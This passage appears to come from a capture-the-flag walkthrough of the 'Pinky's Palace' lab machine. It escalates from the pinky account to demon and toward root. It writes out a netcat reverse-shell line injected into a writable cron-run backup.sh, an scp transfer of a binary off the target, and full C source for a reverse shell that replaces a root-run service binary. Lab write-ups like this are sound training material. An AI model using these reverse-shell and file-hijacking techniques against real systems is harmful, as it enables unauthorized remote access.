uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),1002(stefano)
```
Now the contents of backup.sh can be viewed!
```
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
cat backup.sh
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
```

## Demon Reverse Shell using Backup.sh

By editing the `Backup.sh` file, we can trigger a reverse shell from the Demon account.
```
pinky@Pinkys-Palace:/usr/local/bin$ echo nc -nv 192.168.225.129 443 -e /bin/bash >backup.sh
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
nc -nv 192.168.225.129 443 -e /bin/bash
```

I wasn't sure how the backup.sh script was triggered, but I started my reverse shell on Kali.  As luck would have it, within about a minute the Demon account reached out to connect to my Kali box.
```
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.225.129] from (UNKNOWN) [192.168.225.130] 37492
id
uid=1001(demon) gid=1001(demon) groups=1001(demon)
```

## Enumeration of the Demon user

Not many users left now... feeling pretty close to root.  Now to fix this shell and enumerate.
```
python -c "import pty; pty.spawn('/bin/bash')"
demon@Pinkys-Palace:~$ id
id
uid=1001(demon) gid=1001(demon) groups=1001(demon)
demon@Pinkys-Palace:~$ cd /home/demon
cd /home/demon
demon@Pinkys-Palace:~$ ls
ls
backups
demon@Pinkys-Palace:~$ ls -la   
ls -la
total 24
drwxr-x--- 3 demon demon 4096 Mar 17 20:02 .
drwxr-xr-x 5 root  root  4096 Mar 17 15:20 ..
drwxr-xr-x 2 demon demon 4096 Apr 22 12:35 backups
lrwxrwxrwx 1 root  root     9 Mar 17 20:02 .bash_history -> /dev/null
-rw-r--r-- 1 demon demon  220 May 15  2017 .bash_logout
-rw-r--r-- 1 demon demon 3526 May 15  2017 .bashrc
lrwxrwxrwx 1 root  root     9 Mar 17 20:02 .mysql_history -> /dev/null
-rw-r--r-- 1 demon demon  675 May 15  2017 .profile
```

After reviewing stefanos `bash_history` again, I came across the panel service which I believe is what is running on port 31337.
```
demon@Pinkys-Palace:~$ cd /
demon@Pinkys-Palace:/$ ls 
ls
bin     dev   initrd.img      lib32   lost+found  opt   run   sys  var
boot    etc   initrd.img.old  lib64   media       proc  sbin  tmp  vmlinuz
daemon  home  lib             libx32  mnt         root  srv   usr  vmlinuz.old
demon@Pinkys-Palace:/$ cd daemon
demon@Pinkys-Palace:/daemon$ ls -la
drwxr-x---  2 demon demon  4096 Mar 17 19:48 .
drwxr-xr-x 25 root  root   4096 Mar 17 19:31 ..
-rwxr-x---  1 demon demon 13280 Mar 17 19:48 panel
```

I will likely need to do some reverse engineering on this panel file, so I will SCP to transfer this file to my Kali box for further disection.
```
demon@Pinkys-Palace:/daemon$ scp ./panel root@192.168.225.129:~/panel
scp ./panel root@192.168.225.129:~/panel
The authenticity of host '192.168.225.129 (192.168.225.129)' can't be established.
ECDSA key fingerprint is SHA256:znMLiEnEPPazyk0skENbcmsYYpTdlkf1zbix/qJysiY.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '192.168.225.129' (ECDSA) to the list of known hosts.
root@192.168.225.129's password: <HEY NO PEEKING YOU NOSEY BASTARD!!!>

panel                                         100%   13KB   9.1MB/s   00:00    
demon@Pinkys-Palace:/daemon$ 
```

## Reverse Engineering of the Demon's panel

After spending some time reviewing the assembly code of the panel program, it really does not appear to do much of anything.
It seems to just accept a socket connection, waits for user input, displays back whatever the user writes and then terminate the socket connection.
Had to use the -f parameter on ltrace as the program forks right away.
```
root@kali:~/Desktop# ltrace -f ./panel
[pid 32378] fork()                               = 32379
[pid 32379] <... fork resumed> )                 = 0
[pid 32378] wait(0 <unfinished ...>
[pid 32379] socket(2, 1, 0)                      = 3
[pid 32379] setsockopt(3, 1, 2, 0x7ffe6fcb00cc)  = 0
[pid 32379] htons(0x7a69, 1, 2, 0x7fa1b1130c6a)  = 0x697a
[pid 32379] memset(0x7ffe6fcb00b8, '\0', 8)      = 0x7ffe6fcb00b8
[pid 32379] bind(3, 0x7ffe6fcb00b0, 16, 0x7ffe6fcb00b0) = 0
[pid 32379] listen(3, 5, 16, 0x7fa1b1130797)     = 0
[pid 32379] accept(3, 0x7ffe6fcb00a0, 0x7ffe6fcb009c, 0x7ffe6fcb00a0) = 4
[pid 32379] send(4, 0x400c78, 31, 0)             = 31
[pid 32379] send(4, 0x400c98, 33, 0)             = 33
[pid 32379] send(4, 0x400cb9, 25, 0)             = 25
[pid 32379] recv(4, 0x7ffe6fcaf090, 4096, 0)     = 3
[pid 32379] strcpy(0x7ffe6fcaf010, "ls\n")       = 0x7ffe6fcaf010
[pid 32379] strlen("ls\n")                       = 3
[pid 32379] send(4, 0x7ffe6fcaf010, 3, 0)        = 3
[pid 32379] close(4)                             = 0
[pid 32379] exit(0 <no return ...>
[pid 32379] +++ exited (status 0) +++
[pid 32378] --- SIGCHLD (Child exited) ---
[pid 32378] <... wait resumed> )                 = 32379
[pid 32378] fork()                               = 32381
[pid 32381] <... fork resumed> )                 = 0
[pid 32378] wait(0 <unfinished ...>
[pid 32381] socket(2, 1, 0)                      = 3
[pid 32381] setsockopt(3, 1, 2, 0x7ffe6fcb00cc)  = 0
[pid 32381] htons(0x7a69, 1, 2, 0x7fa1b1130c6a)  = 0x697a
[pid 32381] memset(0x7ffe6fcb00b8, '\0', 8)      = 0x7ffe6fcb00b8
[pid 32381] bind(3, 0x7ffe6fcb00b0, 16, 0x7ffe6fcb00b0) = 0
[pid 32381] listen(3, 5, 16, 0x7fa1b1130797)     = 0
```


However, it IS running as root when I check our processes.  AAAAAAND we can overwrite the file.  

```
demon@Pinkys-Palace:/home/stefano$ ps -aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
---SNIP---
root        456  0.0  0.0   4040   960 ?        Ss   04:34   0:00 /daemon/panel
---SNIP---
```

Again, I have no idea how this is triggered but perhaps if I replace it with a reverse shell I will get lucky again.

I could have used msfvenom to generate this reverse shell code, but I thought I would just create a simple C++ one as GCC is available on this machine. 
I based my reverse shell code on the following source: http://www.wryway.com/blog/creating-tcp-reverse-shell-shellcode/

```
demon@Pinkys-Palace:/daemon$ cat <<EOF >>/daemon/cshell.c
#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define ADDR "192.168.225.129"
#define PORT 444

int main(void) {

    // Create socket for outgoing connection 
    int conn_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 

    // Populate server side connection information    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET; // IPv4
    serv_addr.sin_addr.s_addr = inet_addr(ADDR); // IP address: localhost
    serv_addr.sin_port = htons(PORT);  // Port # 

    // Initiate connection
    connect(conn_sock, (struct sockaddr *) &serv_addr, 16);

    // Forward process's stdin, stdout and stderr to the incoming connection
    dup2(conn_sock,0);
    dup2(conn_sock,1);
    dup2(conn_sock,2);

    // Run shell
    execve("/bin/bash", NULL, NULL);
}
EOF
```

Now to launch the netcat listener on my kali box:
```
root@kali:~# nc -nlvp 444
listening on [any] 444 ...
```

And now for the Switch-a-roo:
```
demon@Pinkys-Palace:/daemon$ mv panel panel.bak
demon@Pinkys-Palace:/daemon$ mv cshell panel
demon@Pinkys-Palace:/daemon$ ls -la
drwxr-x---  2 demon demon  4096 Apr 22 13:24 .
drwxr-xr-x 25 root  root   4096 Mar 17 19:31 ..
-rw-r--r--  1 demon demon   816 Apr 22 13:22 cshell.c
-rwxr-xr-x  1 demon demon  8904 Apr 22 13:22 panel
-rwxr-x---  1 demon demon 13280 Mar 17 19:48 panel.bak
```

Now we play the waiting game...
Nothing happened right away, but I will try to connect to the demon service on 31337 to see if that will trigger it.
Nope, that didnt do it.
Hmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm....
